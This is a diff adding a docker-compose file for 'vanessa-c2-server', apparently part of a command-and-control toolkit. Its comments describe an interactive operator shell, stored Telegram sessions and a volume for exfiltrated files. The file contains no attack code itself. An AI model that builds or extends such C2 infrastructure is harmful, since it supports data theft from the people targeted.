@@ -1,0 +1,41 @@
+version: '3.8'
+
+services:
+  # ── C2 Server (Python) ────────────────────
+  vanessa-c2-server:
+    build:
+      context: ./server
+      dockerfile: Dockerfile
+    container_name: vanessa-c2-server
+    restart: unless-stopped
+    ports:
+      - "5000:5000"
+    # Essential for interactive operator shell
+    stdin_open: true
+    tty: true
+    volumes:
+      # Persist SQLite DB + Telethon sessions across restarts
+      - c2_data:/app/data
+      # Persist exfiltrated files
+      - c2_exfil:/app/exfiltrated
+    env_file:
+      - ./server/.env
+    healthcheck:
+      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:5000/health')"]
+      interval: 30s
+      timeout: 5s
+      retries: 3
+      start_period: 15s
+    networks:
+      - c2_net
+
+volumes:
+  c2_data:
+    name: vanessa_c2_data
+  c2_exfil:
+    name: vanessa_c2_exfil
+
+networks:
+  c2_net:
+    name: vanessa_c2_network
+    driver: bridge
